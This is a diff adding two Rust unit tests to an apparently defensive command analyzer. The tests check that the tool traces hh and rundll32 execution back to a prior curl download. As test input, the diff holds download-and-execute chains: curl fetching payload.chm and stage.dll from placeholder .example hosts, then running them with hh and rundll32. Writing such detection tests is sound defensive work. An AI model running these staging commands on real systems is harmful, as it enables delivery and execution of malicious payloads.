@@ -12499,6 +12499,27 @@ hh payload.chm::/index.htm"#,
     }
 
     #[test]
+    fn html_help_slash_equivalent_member_path_resolves_prior_download_source_url() {
+        let report = crate::analyze(
+            br#"curl -o C:\Temp\payload.chm https://hh-slash-member-source.example/payload.chm
+hh C:/Temp/payload.chm::/index.htm"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "hh C:/Temp/payload.chm::/index.htm"
+                            && url == "https://hh-slash-member-source.example/payload.chm"
+                )
+            }),
+            "HTML Help slash-equivalent member path did not resolve prior download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn browser_url_launchers_emit_url_launch() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
@@ -12816,6 +12837,27 @@ rundll32.exe scrobj.dll,GenerateTypeLib payload.sct"#,
                 )
             }),
             "rundll32 basename DLL did not resolve full-path download source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn rundll32_slash_equivalent_dll_resolves_full_path_download_source() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl -o C:\Temp\stage.dll https://rundll32-slash-equivalent.example/stage.dll"#,
+            &mut env,
+        );
+        interpret_line("rundll32 C:/Temp/stage.dll,EntryPoint", &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Rundll32 { url: Some(url), .. }
+                        if url == "https://rundll32-slash-equivalent.example/stage.dll"
+                )
+            }),
+            "rundll32 slash-equivalent DLL did not resolve full-path download source: {:?}",
             env.traits
         );
     }
